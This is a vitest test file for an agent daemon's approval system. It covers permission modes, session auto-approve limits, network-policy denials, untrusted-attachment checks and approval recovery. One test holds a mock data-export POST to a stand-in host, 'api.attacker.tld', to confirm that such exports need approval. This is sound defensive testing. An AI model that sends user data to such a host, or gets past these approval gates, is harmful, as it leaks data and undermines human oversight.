import { describe, expect, it, vi, afterEach } from "vitest";
import { AgentDaemon } from "../daemon";
import { PermissionSettingsManager } from "../../security/permission-settings-manager";

vi.mock("../../admin/policies", () => ({
  loadPolicies: vi.fn(() => ({
    runtime: {
      allowedPermissionModes: [],
      autoReview: { enabled: true },
      network: {
        defaultAction: "allow",
        allowedDomains: [],
        blockedDomains: [],
        allowShellNetwork: false,
      },
    },
  })),
}));

vi.mock("../../security/network-policy", () => ({
  evaluateNetworkPolicy: vi.fn(() => ({
    action: "allow",
    url: "https://docs.example.com/page",
    domain: "docs.example.com",
    toolName: "web_fetch",
    reason: "allowed",
    ruleSource: "admin_policy",
  })),
}));

import { evaluateNetworkPolicy } from "../../security/network-policy";

describe("AgentDaemon.requestApproval auto-approve controls", () => {
  afterEach(() => {
    vi.useRealTimers();
    vi.mocked(evaluateNetworkPolicy).mockReturnValue({
      action: "allow",
      url: "https://docs.example.com/page",
      domain: "docs.example.com",
      toolName: "web_fetch",
      reason: "allowed",
      ruleSource: "admin_policy",
    });
  });

  it("uses dont_ask as the default permission mode for automated tasks", () => {
    const daemonLike = {
      getExecutorForTask: vi.fn().mockReturnValue(null),
      logEvent: vi.fn(),
    } as Any;

    const mode = AgentDaemon.prototype["buildPermissionMode"].call(daemonLike, "task-auto", {
      id: "task-auto",
      source: "cron",
      status: "executing",
      agentConfig: {},
    });

    expect(mode).toBe("dont_ask");
  });

  it("keeps explicit task permission modes for automated tasks", () => {
    const daemonLike = {
      getExecutorForTask: vi.fn().mockReturnValue(null),
      logEvent: vi.fn(),
    } as Any;

    const mode = AgentDaemon.prototype["buildPermissionMode"].call(daemonLike, "task-auto", {
      id: "task-auto",
      source: "cron",
      status: "executing",
      agentConfig: { permissionMode: "default" },
    });

    expect(mode).toBe("default");
  });

  it("keeps runtime permission modes ahead of automated task defaults", () => {
    const daemonLike = {
      getExecutorForTask: vi.fn().mockReturnValue({
        runtime: {
          getPermissionState: vi.fn().mockReturnValue({ mode: "plan" }),
        },
      }),
      logEvent: vi.fn(),
    } as Any;

    const mode = AgentDaemon.prototype["buildPermissionMode"].call(daemonLike, "task-auto", {
      id: "task-auto",
      source: "cron",
      status: "executing",
      agentConfig: {},
    });

    expect(mode).toBe("plan");
  });

  it("keeps manual tasks on the configured default permission mode", () => {
    const loadSettings = vi.spyOn(PermissionSettingsManager, "loadSettings").mockReturnValue({
      version: 1,
      defaultMode: "default",
      defaultShellEnabled: false,
      defaultPermissionAccess: "default",
      rules: [],
    });
    const daemonLike = {
      getExecutorForTask: vi.fn().mockReturnValue(null),
      logEvent: vi.fn(),
    } as Any;

    const mode = AgentDaemon.prototype["buildPermissionMode"].call(daemonLike, "task-manual", {
      id: "task-manual",
      source: "manual",
      status: "executing",
      agentConfig: {},
    });

    expect(mode).toBe("default");
    expect(loadSettings).toHaveBeenCalled();
    loadSettings.mockRestore();
  });

  it("allows automation write_file permission checks without prompting", () => {
    const workspace = {
      id: "workspace-1",
      name: "Workspace",
      path: "/Users/me/project",
      permissions: {
        read: true,
        write: true,
        delete: true,
        network: true,
        shell: true,
      },
      createdAt: Date.now(),
    };
    const daemonLike = Object.assign(Object.create(AgentDaemon.prototype), {
      taskRepo: {
        findById: vi.fn().mockReturnValue({
          id: "task-auto",
          workspaceId: workspace.id,
          source: "cron",
          status: "executing",
          agentConfig: {},
        }),
      },
      workspaceRepo: {
        findById: vi.fn().mockReturnValue(workspace),
      },
      workspacePermissionRuleRepo: {
        listByWorkspaceId: vi.fn().mockReturnValue([]),
      },
      getExecutorForTask: vi.fn().mockReturnValue(null),
      logEvent: vi.fn(),
    }) as Any;

    const result = AgentDaemon.prototype.evaluateToolPermission.call(daemonLike, "task-auto", {
      approvalType: "external_service",
      toolName: "write_file",
      details: {
        path: "package.json",
        params: {
          path: "package.json",
        },
      },
    });

    expect(result.decision).toBe("allow");
    expect(result.reason).toEqual(
      expect.objectContaining({
        type: "mode",
        mode: "dont_ask",
      }),
    );
  });

  it("keeps session approve-all behavior for safe network reads", async () => {
    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-1" }),
      update: vi.fn(),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for network read." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for network read." },
        scopePreview: "domain docs.example.com",
        suggestedActions: [],
      },
      scope: { kind: "domain", toolName: "web_fetch", domain: "docs.example.com" },
      trackingKey: "domain:web_fetch:docs.example.com",
      runtime: null,
      workspace: undefined,
    });

    const daemonLike = {
      sessionAutoApproveAll: true,
      approvalRepo,
      logEvent: vi.fn(),
      updateTask: vi.fn(),
      evaluatePermissionRequest,
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      taskRepo: {
        findById: vi.fn().mockReturnValue({ agentConfig: { autonomousMode: true } }),
      },
      pendingApprovals: new Map(),
    } as Any;

    const approved = await AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      "task-1",
      "network_access",
      "Approve action",
      { tool: "web_fetch", params: { url: "https://docs.example.com/page" } },
    );

    expect(approved).toBe(true);
    expect(approvalRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        status: "approved",
      }),
    );
    expect(evaluatePermissionRequest).toHaveBeenCalled();
    expect(evaluateNetworkPolicy).toHaveBeenCalledWith({
      url: "https://docs.example.com/page",
      toolName: "web_fetch",
    });
  });

  it("does not session auto-approve network reads denied by network policy", async () => {
    vi.useFakeTimers();
    vi.mocked(evaluateNetworkPolicy).mockReturnValueOnce({
      action: "deny",
      url: "https://blocked.example/page",
      domain: "blocked.example",
      toolName: "web_fetch",
      reason: "blocked_domain",
      ruleSource: "admin_policy",
    });

    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-denied-net" }),
      update: vi.fn(),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for network read." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for network read." },
        scopePreview: "domain blocked.example",
        suggestedActions: [],
      },
      scope: { kind: "domain", toolName: "web_fetch", domain: "blocked.example" },
      trackingKey: "domain:web_fetch:blocked.example",
      runtime: null,
      workspace: undefined,
    });

    const daemonLike = {
      sessionAutoApproveAll: true,
      approvalRepo,
      logEvent: vi.fn(),
      updateTask: vi.fn(),
      evaluatePermissionRequest,
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      taskRepo: {
        findById: vi.fn().mockReturnValue({ agentConfig: { autonomousMode: true } }),
      },
      pendingApprovals: new Map(),
    } as Any;

    const approvalPromise = AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      "task-denied-net",
      "network_access",
      "Approve action",
      { tool: "web_fetch", params: { url: "https://blocked.example/page" } },
    );

    expect(approvalRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        status: "pending",
      }),
    );
    expect(daemonLike.pendingApprovals.size).toBe(1);

    const pending = daemonLike.pendingApprovals.get("approval-denied-net");
    clearTimeout(pending.timeoutHandle);
    pending.resolve(false);

    await expect(approvalPromise).resolves.toBe(false);
  });

  it("does not treat project test commands as auto-review safe shell commands", () => {
    expect(AgentDaemon.prototype["isAutoReviewSafeCommand"].call({} as Any, "npm test")).toBe(false);
    expect(AgentDaemon.prototype["isAutoReviewSafeCommand"].call({} as Any, "pytest")).toBe(false);
    expect(AgentDaemon.prototype["isAutoReviewSafeCommand"].call({} as Any, "git status")).toBe(true);
  });

  it("disables auto-approve when allowAutoApprove=false is passed", async () => {
    vi.useFakeTimers();

    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-2" }),
      update: vi.fn(),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
        scopePreview: "tool x402_fetch",
        suggestedActions: [],
      },
      scope: { kind: "tool", toolName: "x402_fetch" },
      trackingKey: "tool x402_fetch",
      runtime: null,
      workspace: undefined,
    });

    const daemonLike = {
      sessionAutoApproveAll: true,
      approvalRepo,
      logEvent: vi.fn(),
      updateTask: vi.fn(),
      evaluatePermissionRequest,
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      taskRepo: {
        findById: vi.fn().mockReturnValue({ agentConfig: { autonomousMode: true } }),
      },
      pendingApprovals: new Map(),
    } as Any;

    const approvalPromise = AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      "task-2",
      "external_service",
      "Approve payment",
      { tool: "x402_fetch" },
      { allowAutoApprove: false },
    );

    expect(approvalRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        status: "pending",
      }),
    );
    expect(daemonLike.pendingApprovals.size).toBe(1);

    const pending = daemonLike.pendingApprovals.get("approval-2");
    clearTimeout(pending.timeoutHandle);
    pending.resolve(true);

    await expect(approvalPromise).resolves.toBe(true);
  });

  it("scopes task auto-approve to explicitly allowed approval types", async () => {
    vi.useFakeTimers();

    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-3" }),
      update: vi.fn(),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
        scopePreview: "tool x402_fetch",
        suggestedActions: [],
      },
      scope: { kind: "tool", toolName: "x402_fetch" },
      trackingKey: "tool x402_fetch",
      runtime: null,
      workspace: undefined,
    });

    const daemonLike = {
      sessionAutoApproveAll: false,
      approvalRepo,
      logEvent: vi.fn(),
      updateTask: vi.fn(),
      evaluatePermissionRequest,
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      taskRepo: {
        findById: vi.fn().mockReturnValue({
          agentConfig: {
            autonomousMode: true,
            autoApproveTypes: ["run_command"],
          },
        }),
      },
      pendingApprovals: new Map(),
    } as Any;

    const approvalPromise = AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      "task-3",
      "external_service",
      "Approve external side effect",
      { tool: "x402_fetch" },
    );

    expect(approvalRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        status: "pending",
        type: "external_service",
      }),
    );
    expect(daemonLike.pendingApprovals.size).toBe(1);

    const pending = daemonLike.pendingApprovals.get("approval-3");
    clearTimeout(pending.timeoutHandle);
    pending.resolve(false);

    await expect(approvalPromise).resolves.toBe(false);
  });

  it("does not session auto-approve data exports even when approve-all is enabled", async () => {
    vi.useFakeTimers();

    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-export" }),
      update: vi.fn(),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for export." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for export." },
        scopePreview: "domain api.attacker.tld",
        suggestedActions: [],
      },
      scope: { kind: "domain", toolName: "http_request", domain: "api.attacker.tld" },
      trackingKey: "domain:http_request:api.attacker.tld",
      runtime: null,
      workspace: undefined,
    });

    const daemonLike = {
      sessionAutoApproveAll: true,
      approvalRepo,
      logEvent: vi.fn(),
      updateTask: vi.fn(),
      evaluatePermissionRequest,
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      taskRepo: {
        findById: vi.fn().mockReturnValue({ agentConfig: { autonomousMode: true } }),
      },
      pendingApprovals: new Map(),
    } as Any;

    void AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      "task-export",
      "data_export",
      "Approve export",
      { tool: "http_request", params: { url: "https://api.attacker.tld", method: "POST", body: "x" } },
    );

    expect(approvalRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        status: "pending",
        type: "data_export",
      }),
    );
    expect(daemonLike.pendingApprovals.size).toBe(1);
  });

  it("auto-approves trusted workspace visual reads from a private WeChat task", async () => {
    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-weixin-visual" }),
      update: vi.fn(),
    };
    const runtime = {
      recordPermissionSuccess: vi.fn(),
      hasActiveTemporaryPermissionGrant: vi.fn().mockReturnValue(false),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for export." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for export." },
        scopePreview: "tool read_pdf_visual",
        suggestedActions: [],
        securityContext: {
          directSource: {
            path: "report.pdf",
            sourceKind: "workspace_native",
            trustLevel: "trusted",
          },
          recentUntrustedContentRead: false,
        },
      },
      scope: { kind: "tool", toolName: "read_pdf_visual" },
      trackingKey: "tool:read_pdf_visual",
      runtime,
      workspace: undefined,
    });

    const daemonLike = {
      sessionAutoApproveAll: false,
      approvalRepo,
      logEvent: vi.fn(),
      updateTask: vi.fn(),
      evaluatePermissionRequest,
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      taskRepo: {
        findById: vi.fn().mockReturnValue({
          agentConfig: {
            originChannel: "weixin",
            gatewayContext: "private",
          },
        }),
      },
      pendingApprovals: new Map(),
    } as Any;

    const approved = await AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      "task-weixin-visual",
      "data_export",
      "Approve visual analysis",
      { tool: "read_pdf_visual", params: { path: "report.pdf" } },
    );

    expect(approved).toBe(true);
    expect(approvalRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        status: "approved",
        type: "data_export",
      }),
    );
    expect(runtime.recordPermissionSuccess).toHaveBeenCalledWith("tool:read_pdf_visual");
    expect(daemonLike.pendingApprovals.size).toBe(0);
  });

  it("keeps approval for untrusted WeChat attachments used by visual tools", () => {
    const daemonLike = {
      taskRepo: {
        findById: vi.fn().mockReturnValue({
          agentConfig: {
            originChannel: "weixin",
            gatewayContext: "private",
          },
        }),
      },
    } as Any;

    const result = AgentDaemon.prototype["canAutoReviewApprove"].call(
      daemonLike,
      "task-weixin-attachment",
      "data_export",
      {
        tool: "analyze_image",
        permissionPrompt: {
          securityContext: {
            directSource: {
              path: ".neoworker/inbox/attachments/weixin/photo.png",
              sourceKind: "channel_attachment",
              trustLevel: "untrusted",
            },
            recentUntrustedContentRead: true,
          },
        },
      },
    );

    expect(result).toEqual({ approved: false });
  });

  it("does not session auto-approve computer_use even when session auto-approve is enabled", async () => {
    vi.useFakeTimers();

    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-cu" }),
      update: vi.fn(),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
        scopePreview: "tool computer_use",
        suggestedActions: [],
      },
      scope: { kind: "tool", toolName: "computer_use" },
      trackingKey: "tool computer_use",
      runtime: null,
      workspace: undefined,
    });

    const daemonLike = {
      sessionAutoApproveAll: true,
      approvalRepo,
      logEvent: vi.fn(),
      updateTask: vi.fn(),
      evaluatePermissionRequest,
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      taskRepo: {
        findById: vi.fn().mockReturnValue({ agentConfig: { autonomousMode: true } }),
      },
      pendingApprovals: new Map(),
    } as Any;

    void AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      "task-cu",
      "computer_use",
      "Allow app for session",
      { kind: "computer_use_app_grant", appName: "Safari" },
      { allowAutoApprove: false },
    );

    expect(approvalRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        status: "pending",
        type: "computer_use",
      }),
    );
    expect(daemonLike.pendingApprovals.size).toBe(1);
  });

  it("does not overwrite terminal task state when an approval times out late", async () => {
    vi.useFakeTimers();

    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-timeout" }),
      update: vi.fn(),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
        scopePreview: "tool x402_fetch",
        suggestedActions: [],
      },
      scope: { kind: "tool", toolName: "x402_fetch" },
      trackingKey: "tool x402_fetch",
      runtime: null,
      workspace: undefined,
    });
    const updateTask = vi.fn();
    const logEvent = vi.fn();

    const daemonLike = {
      sessionAutoApproveAll: false,
      approvalRepo,
      logEvent,
      updateTask,
      evaluatePermissionRequest,
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      taskRepo: {
        findById: vi.fn().mockReturnValue({
          id: "task-timeout",
          status: "completed",
          completedAt: Date.now(),
          terminalStatus: "ok",
        }),
      },
      pendingApprovals: new Map(),
    } as Any;

    const approvalPromise = AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      "task-timeout",
      "external_service",
      "Approve action",
      { tool: "x402_fetch" },
    );

    expect(updateTask).toHaveBeenCalledWith(
      "task-timeout",
      expect.objectContaining({
        status: "blocked",
        terminalStatus: "awaiting_approval",
      }),
    );

    const rejection = expect(approvalPromise).rejects.toThrow(
      "Approval request timed out after task completion",
    );
    await vi.advanceTimersByTimeAsync(5 * 60 * 1000);

    await rejection;
    expect(approvalRepo.update).toHaveBeenCalledWith("approval-timeout", "denied");
    expect(updateTask).not.toHaveBeenCalledWith(
      "task-timeout",
      expect.objectContaining({
        status: "paused",
        terminalStatus: "needs_user_action",
        error: "Approval request timed out",
      }),
    );
    expect(logEvent).not.toHaveBeenCalledWith(
      "task-timeout",
      "approval_denied",
      expect.objectContaining({
        approvalId: "approval-timeout",
        reason: "timeout",
      }),
    );
    expect(daemonLike.pendingApprovals.size).toBe(0);
  });

  it("persists workspace approval rules and resolves the pending approval", async () => {
    const runtime = {
      recordPermissionSuccess: vi.fn(),
      recordPermissionDenial: vi.fn(),
      addTemporaryPermissionGrant: vi.fn(),
    };
    const pendingApprovals = new Map<string, Any>();
    pendingApprovals.set("approval-4", {
      taskId: "task-4",
      approval: {
        id: "approval-4",
        taskId: "task-4",
        type: "external_service",
        details: {
          permissionPrompt: {
            scope: { kind: "tool", toolName: "open_url" },
            scopePreview: "tool open_url",
            reason: { type: "mode", mode: "default", summary: "Prompt for side effects." },
            suggestedActions: [],
          },
        },
      },
      resolve: vi.fn(),
      reject: vi.fn(),
      resolved: false,
      timeoutHandle: setTimeout(() => undefined, 60_000),
    });

    const daemonLike = {
      pendingApprovals,
      approvalRepo: {
        update: vi.fn(),
      },
      updateTask: vi.fn(),
      logEvent: vi.fn(),
      taskRepo: {
        findById: vi.fn().mockReturnValue({
          id: "task-4",
          workspaceId: "workspace-4",
        }),
      },
      workspaceRepo: {
        findById: vi.fn().mockReturnValue({
          id: "workspace-4",
          path: "/tmp/workspace-4",
        }),
      },
      workspacePermissionRuleRepo: {
        create: vi.fn(),
      },
      getExecutorForTask: vi.fn().mockReturnValue({ runtime }),
      buildPermissionTrackingKey: vi.fn().mockReturnValue("tool open_url"),
      persistApprovalActionRule: AgentDaemon.prototype["persistApprovalActionRule"],
    } as Any;

    const manifestSpy = vi.spyOn(
      await import("../../security/workspace-permission-manifest"),
      "appendWorkspacePermissionManifestRule",
    ).mockReturnValue({
      success: true,
      manifestPath: "/tmp/workspace-4/.neoworker/policy/permissions.json",
    });

    const result = await AgentDaemon.prototype.respondToApproval.call(
      daemonLike,
      "approval-4",
      true,
      "allow_workspace",
    );

    expect(result).toBe("handled");
    expect(daemonLike.workspacePermissionRuleRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        workspaceId: "workspace-4",
        effect: "allow",
        scope: { kind: "tool", toolName: "open_url" },
      }),
    );
    expect(manifestSpy).toHaveBeenCalled();
    expect(runtime.recordPermissionSuccess).toHaveBeenCalledWith("tool open_url");
    expect(daemonLike.approvalRepo.update).toHaveBeenCalledWith("approval-4", "approved");

    manifestSpy.mockRestore();
  });

  it("recovers a persisted approval when the in-memory waiter was lost", async () => {
    const approval = {
      id: "approval-recovered-after-restart",
      taskId: "task-recovered-after-restart",
      type: "run_command",
      description: "Approve command",
      details: {
        approvalMode: "single_bundle",
        permissionPrompt: {
          scope: { kind: "tool", toolName: "run_command" },
          scopePreview: "tool run_command",
          reason: { type: "mode", mode: "default", summary: "Approval required." },
          suggestedActions: [],
        },
      },
      status: "pending",
      requestedAt: Date.now(),
    };
    const task = {
      id: approval.taskId,
      status: "blocked",
      terminalStatus: "awaiting_approval",
    };
    const updateTask = vi.fn();
    const resumeInterruptedTask = vi.fn().mockResolvedValue(undefined);
    const daemonLike = {
      pendingApprovals: new Map(),
      recoveredApprovalGrants: new Map(),
      activeTasks: new Map(),
      approvalRepo: {
        findById: vi.fn().mockReturnValue(approval),
        findPendingByTaskId: vi.fn().mockReturnValue([]),
        update: vi.fn(),
      },
      taskRepo: {
        findById: vi.fn().mockReturnValue(task),
      },
      updateTask,
      logEvent: vi.fn(),
      persistApprovalActionRule: vi.fn().mockReturnValue({ effect: "allow" }),
      resumeInterruptedTask,
      rememberRecoveredApprovalGrant:
        AgentDaemon.prototype["rememberRecoveredApprovalGrant"],
      recoverPersistedApproval: AgentDaemon.prototype["recoverPersistedApproval"],
    } as Any;

    const result = await AgentDaemon.prototype.respondToApproval.call(
      daemonLike,
      approval.id,
      true,
      "allow_once",
    );

    expect(result).toBe("handled");
    expect(daemonLike.approvalRepo.update).toHaveBeenCalledWith(approval.id, "approved");
    expect(updateTask).toHaveBeenCalledWith(
      task.id,
      expect.objectContaining({
        status: "interrupted",
        terminalStatus: undefined,
      }),
    );
    expect(daemonLike.recoveredApprovalGrants.get(task.id)).toEqual([
      {
        approval,
        action: "allow_once",
      },
    ]);
    expect(resumeInterruptedTask).toHaveBeenCalledWith(
      expect.objectContaining({
        id: task.id,
        status: "interrupted",
      }),
    );
  });

  it("returns the cached not-found result instead of masking it as a duplicate", async () => {
    const findById = vi.fn().mockReturnValue(null);
    const daemonLike = {
      pendingApprovals: new Map(),
      approvalRepo: { findById },
      recoverPersistedApproval: AgentDaemon.prototype["recoverPersistedApproval"],
    } as Any;

    const first = await AgentDaemon.prototype.respondToApproval.call(
      daemonLike,
      "approval-missing-cache-contract",
      true,
      "allow_once",
    );
    const second = await AgentDaemon.prototype.respondToApproval.call(
      daemonLike,
      "approval-missing-cache-contract",
      true,
      "allow_once",
    );

    expect(first).toBe("not_found");
    expect(second).toBe("not_found");
    expect(findById).toHaveBeenCalledTimes(1);
  });

  it("keeps a recovered task blocked until every persisted approval is resolved", async () => {
    const approval = {
      id: "approval-recovered-with-another-pending",
      taskId: "task-recovered-with-another-pending",
      type: "run_command",
      description: "Approve command",
      details: {
        permissionPrompt: {
          scope: { kind: "tool", toolName: "run_command" },
          scopePreview: "tool run_command",
          reason: { type: "mode", mode: "default", summary: "Approval required." },
          suggestedActions: [],
        },
      },
      status: "pending",
      requestedAt: Date.now(),
    };
    const task = {
      id: approval.taskId,
      status: "blocked",
      terminalStatus: "awaiting_approval",
    };
    const updateTask = vi.fn();
    const logEvent = vi.fn();
    const resumeInterruptedTask = vi.fn().mockResolvedValue(undefined);
    const daemonLike = {
      pendingApprovals: new Map(),
      recoveredApprovalGrants: new Map(),
      activeTasks: new Map(),
      approvalRepo: {
        findById: vi.fn().mockReturnValue(approval),
        findPendingByTaskId: vi.fn().mockReturnValue([
          {
            ...approval,
            id: "approval-still-pending",
          },
        ]),
        update: vi.fn(),
      },
      taskRepo: {
        findById: vi.fn().mockReturnValue(task),
      },
      updateTask,
      logEvent,
      persistApprovalActionRule: vi.fn().mockReturnValue({ effect: "allow" }),
      resumeInterruptedTask,
      rememberRecoveredApprovalGrant:
        AgentDaemon.prototype["rememberRecoveredApprovalGrant"],
      recoverPersistedApproval: AgentDaemon.prototype["recoverPersistedApproval"],
    } as Any;

    const result = await AgentDaemon.prototype.respondToApproval.call(
      daemonLike,
      approval.id,
      true,
      "allow_once",
    );

    expect(result).toBe("handled");
    expect(updateTask).toHaveBeenCalledWith(
      task.id,
      expect.objectContaining({
        status: "blocked",
        terminalStatus: "awaiting_approval",
      }),
    );
    expect(logEvent).toHaveBeenCalledWith(
      task.id,
      "task_status",
      expect.objectContaining({
        status: "blocked",
        pendingApprovalCount: 1,
      }),
    );
    expect(resumeInterruptedTask).not.toHaveBeenCalled();
  });
});

describe("AgentDaemon.buildPermissionRules", () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("does not create legacy guardrail allow rules when trusted commands are disabled", async () => {
    const { GuardrailManager } = await import("../../guardrails/guardrail-manager");
    const { PermissionSettingsManager } = await import("../../security/permission-settings-manager");
    const { BuiltinToolsSettingsManager } = await import("../tools/builtin-settings");

    vi.spyOn(GuardrailManager, "loadSettings").mockReturnValue({
      autoApproveTrustedCommands: false,
      trustedCommandPatterns: ["git status*"],
    } as Any);
    vi.spyOn(PermissionSettingsManager, "loadSettings").mockReturnValue({
      defaultMode: "default",
      rules: [],
    } as Any);
    vi.spyOn(BuiltinToolsSettingsManager, "getToolAutoApprove").mockReturnValue(false);

    const daemonLike = {
      getExecutorForTask: vi.fn().mockReturnValue(null),
      workspacePermissionRuleRepo: {
        listByWorkspaceId: vi.fn().mockReturnValue([]),
      },
    } as Any;

    const rules = AgentDaemon.prototype["buildPermissionRules"].call(
      daemonLike,
      "task-1",
      undefined,
      undefined,
    );

    expect(rules.filter((rule: Any) => rule.source === "legacy_guardrails")).toEqual([]);
  });

  it("does not create blanket autonomy allow rules when autoApproveTypes is empty", async () => {
    const { GuardrailManager } = await import("../../guardrails/guardrail-manager");
    const { PermissionSettingsManager } = await import("../../security/permission-settings-manager");
    const { BuiltinToolsSettingsManager } = await import("../tools/builtin-settings");

    vi.spyOn(GuardrailManager, "loadSettings").mockReturnValue({
      autoApproveTrustedCommands: false,
      trustedCommandPatterns: [],
    } as Any);
    vi.spyOn(PermissionSettingsManager, "loadSettings").mockReturnValue({
      defaultMode: "default",
      rules: [],
    } as Any);
    vi.spyOn(BuiltinToolsSettingsManager, "getToolAutoApprove").mockReturnValue(false);

    const daemonLike = {
      getExecutorForTask: vi.fn().mockReturnValue(null),
      workspacePermissionRuleRepo: {
        listByWorkspaceId: vi.fn().mockReturnValue([]),
      },
    } as Any;

    const rules = AgentDaemon.prototype["buildPermissionRules"].call(
      daemonLike,
      "task-empty-autonomy",
      {
        agentConfig: {
          autonomousMode: true,
          autoApproveTypes: [],
        },
      },
      undefined,
    );

    expect(rules).toEqual([]);
  });
});
